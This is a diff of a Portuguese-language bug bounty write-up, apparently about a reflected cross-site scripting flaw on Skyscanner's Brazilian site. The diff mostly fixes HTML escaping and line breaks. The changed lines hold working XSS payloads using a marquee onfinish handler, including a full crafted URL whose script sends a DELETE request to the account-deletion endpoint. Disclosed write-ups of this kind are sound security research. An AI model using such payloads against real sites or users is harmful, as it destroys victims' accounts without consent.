@@ -16,7 +16,6 @@ Enquanto navegava pela aplicação, notei que ao fazer uma busca, haviam vários
 <p>
 <code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/kef/190615/190622/?adults=1&children=0&adultsv2=1&childrenv2=&infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home#results</code>
 <br>
-<br>
 </p>
 
 <p align="justify">
@@ -42,7 +41,7 @@ Ao inserir determinados payloads, eu recebia um código 500 e a aplicação era 
 <br>
 Depois de algumas tentativas, decidi inserir uma tag que já havia utilizado em outros programas de bug bounty:
 <br>
-<code>">&ltmarquee>rapt00r&lt/marquee></code>
+<code>">&lt;marquee>rapt00r&lt;/marquee></code>
 <br>
 <br>
 Esta tag cria uma espécie de painel (tipo aqueles painéis de LED que as letras ficam indo de uma ponta a outra do painel)
@@ -64,13 +63,14 @@ Dependendo do tamanho do painel que era criado, demoraria muito para o banner fi
 <p align="justify">
 Bom, nesse ponto nosso payload estava da seguinte forma:
 <br>
-<code>">&ltmarquee width=0 loop=1 onfinish="alert(1)">rapt00r&lt/marquee></code>
+<code>">&lt;marquee width=0 loop=1 onfinish="alert(1)">rapt00r&lt;/marquee></code>
 <br>
 </p>
 
 <p>
 Agora, o link junto com o payload ficaria da seguinte forma:
-<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home">&ltmarquee width=0 loop=1 onfinish="alert(1)">rapt00r&lt/marquee>&ampcurrency=BOB</code>
+<br>
+<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home">&lt;marquee width=0 loop=1 onfinish="alert(1)">rapt00r&lt;/marquee>&ampcurrency=BOB</code>
 </p>
 
 <p align="justify">
@@ -97,11 +97,10 @@ request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-accoun
 request.send();</code>
 
 <p align="justify">
-<br>
 E o link final para explorar a vulnerabilidade ficou da seguinte forma:
 </p>
 <p>
-<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=https://www.google.com"/> &ltmarquee loop=1 width=0 onfinish="var request = new XMLHttpRequest(); request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-account', false); request.send();">&lt/marquee>&ampcurrency=BOB</code>
+<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=https://www.google.com"/> &lt;marquee loop=1 width=0 onfinish="var request = new XMLHttpRequest(); request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-account', false); request.send();">&lt;/marquee>&ampcurrency=BOB</code>
 </p>
 
 <p align="justify">
